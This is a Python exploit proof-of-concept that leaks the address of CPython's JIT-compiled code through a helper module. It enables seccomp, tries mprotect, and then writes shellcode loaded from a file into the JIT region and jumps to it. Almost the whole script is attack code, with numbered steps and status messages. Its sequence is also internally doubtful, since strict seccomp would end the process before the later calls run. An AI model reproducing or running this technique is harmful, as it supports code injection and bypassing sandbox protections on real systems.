import ctypes
import jitexecleak

# Constants
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
PAGE_SIZE = 0x1000

libc = ctypes.CDLL("libc.so.6")

# Step 1: Apply seccomp strict mode (disallows mprotect)
def apply_seccomp_strict():
    PR_SET_SECCOMP = 22
    SECCOMP_MODE_STRICT = 1
    res = libc.prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT, 0, 0, 0)
    if res != 0:
        raise RuntimeError("[-] Failed to apply seccomp strict mode")
    print("[+] Seccomp strict mode enabled (mprotect blocked)")

# Step 2: Hot loop to trigger JIT
def hot_loop(x):
    total = 0
    for _ in range(100_000):
        total += x ^ 3
    return total

print("[*] Triggering JIT...")
for _ in range(1000):
    hot_loop(42)

# Step 3: Leak executor->jit_code
jit_addr = jitexecleak.leak_executor_jit(hot_loop)
print(f"[+] Leaked executor->jit_code: 0x{jit_addr:x}")

# Step 4: Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

# Step 5: Try to make JIT region RWX (will fail under seccomp)
aligned = jit_addr & ~(PAGE_SIZE - 1)

print("[*] Applying seccomp filter to block mprotect()...")
apply_seccomp_strict()

print("[*] Attempting mprotect() (expected to fail)...")
res = libc.mprotect(ctypes.c_void_p(aligned), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC)

if res != 0:
    print("[+] mprotect() blocked by seccomp as expected.")
else:
    print("[-] Unexpected: mprotect() succeeded!")

# Step 6: Write and execute shellcode anyway
print("[*] Injecting shellcode...")
ctypes.memmove(jit_addr, shellcode, len(shellcode))

print("[*] Jumping to shellcode...")
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(jit_addr)
fn()
